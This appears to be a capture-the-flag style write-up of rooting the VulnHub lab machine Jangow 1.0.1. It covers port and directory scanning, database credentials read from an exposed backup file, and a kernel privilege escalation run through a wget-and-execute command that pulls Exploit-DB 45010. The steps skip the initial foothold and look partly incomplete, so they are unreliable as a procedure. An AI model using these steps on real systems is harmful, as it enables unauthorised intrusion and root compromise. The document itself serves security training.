# 🔐 Jangow: 1.0.1 — VulnHub Write-up

## 🎯 Objective
Gain root access through enumeration, exploitation, and privilege escalation.

## 🖥️ Environment
Attacker: Kali Linux | Target: Jangow 1.0.1 (VirtualBox) | Network: Host-only (192.168.56.0/24)

## 🔎 Enumeration

**Network Discovery:**
nmap -sS -p- (target-ip) <br>
Result: <br>a.22/tcp open ssh <br> b.80/tcp open http

**Web Directory Scan:**
gobuster dir -u http://(target-ip) -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip<br>
Key findings:<br>a. /site <br>b./.backup

## 🔑 Credential Exposure

Accessed hidden file: http://(target-ip)/.backup
Recovered credentials:<br> $database="jangow01";<br> $username="jangow01";<br>$password="abygurl69";

## 🛠️ Privilege Escalation

**System Identification:**
uname -a | lsb_release -a<br>
Result: Vulnerable kernel version detected

**SUID Check:**
find / -perm -4000 2>/dev/null<br>
Result: No directly exploitable SUID binaries

**Exploit Used (Exploit-DB 45010):**
wget https://www.exploit-db.com/download/45010 && chmod +x 45010 && ./45010<br>
Result: whoami → root

## ✅ Final Result
Root access successfully obtained on the target system.

## 📌 Lessons Learned
- ✅ Enumeration beyond default paths is critical
- 🔐 Backup files can expose sensitive credentials
- 🧩 Kernel version must always be checked
- 📎 Public exploits must match OS and architecture
- 🎛️ Priv-esc requires verification, not guessing
